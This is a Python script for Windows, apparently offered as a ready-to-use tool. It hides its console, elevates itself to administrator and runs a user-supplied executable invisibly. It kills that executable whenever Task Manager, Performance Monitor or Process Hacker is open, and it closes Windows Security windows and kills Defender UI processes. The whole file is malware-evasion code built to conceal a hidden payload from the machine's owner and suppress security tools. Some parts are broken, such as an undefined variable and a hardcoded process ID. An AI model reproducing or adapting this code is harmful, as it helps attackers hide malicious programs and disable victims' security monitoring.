import sys
import time
import subprocess
import psutil
import pygetwindow as gw
import ctypes
import os
import win32gui
import win32con

file_path = "file.exe" # замените на название вашего файла
defender_path = "C:\\Windows\\SystemApps\\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy"
processes = ["taskmgr.exe", "perfmon.exe", "ProcessHacker.exe"]


def is_admin():
    return ctypes.windll.shell32.IsUserAnAdmin()


def run_as_admin():
    if not is_admin():
        script_path = os.path.abspath(sys.argv[0])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script_path}"', None, 0)
        return False
    return True


def is_process_running(process_name):
    for process in psutil.process_iter(['name']):
        if process.info['name'].lower() == process_name.lower():
            return True
    return False


def open_program(program_path):
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = 0
    subprocess.Popen(program_path, startupinfo=startupinfo)


def close_program(process_name):
    for process in psutil.process_iter(['name']):
        if process.info['name'].lower() == process_name.lower():
            process.kill()
            return


def close_security_app():
    try:
        if defender_path in str(process.info.get('exe', '')):
            process.kill()
        elif process.info['name'] == 'SecurityHealthSystray.exe':
            process.kill()
        elif process.info['name'] == 'SecurityHealthHost.exe':
            process.kill()
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        pass


def enum_window_callback(hwnd, windows):
    if win32gui.IsWindowVisible(hwnd):
        window_class = win32gui.GetClassName(hwnd)
        window_title = win32gui.GetWindowText(hwnd)
        if window_class == "ApplicationFrameWindow" and (
                "Безопасность Windows" in window_title or
                "Windows Security" in window_title):
            windows.append(hwnd)
        if window_class == "ApplicationFrameWindow":
            pid = win32gui.GetWindowThreadProcessId(hwnd)[1]
            if pid == 10356:
                windows.append(hwnd)
    return True


def is_forbidden_window_open():
    windows = []
    win32gui.EnumWindows(enum_window_callback, windows)
    for process in psutil.process_iter(['exe']):
        if defender_path in str(process.info.get('exe', '')):
            return True
    return len(windows) > 0


def close_forbidden_windows():
    windows = []
    win32gui.EnumWindows(enum_window_callback, windows)
    for hwnd in windows:
        win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
    close_security_app()


if __name__ == "__main__":
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd != 0:
        ctypes.windll.user32.ShowWindow(hwnd, 0)
    if not run_as_admin():
        sys.exit(0)
    try:
        while True:
            forbidden_window = is_forbidden_window_open()
            if any(is_process_running(process_name) for process_name in processes) or forbidden_window:
                if is_process_running(file_path):
                    close_program(file_path)
                if forbidden_window:
                    close_forbidden_windows()
            else:
                if not is_process_running(file_path):
                    open_program(file_path)
            time.sleep(0.01)
    except KeyboardInterrupt:
        close_program(file_path)
        exit()
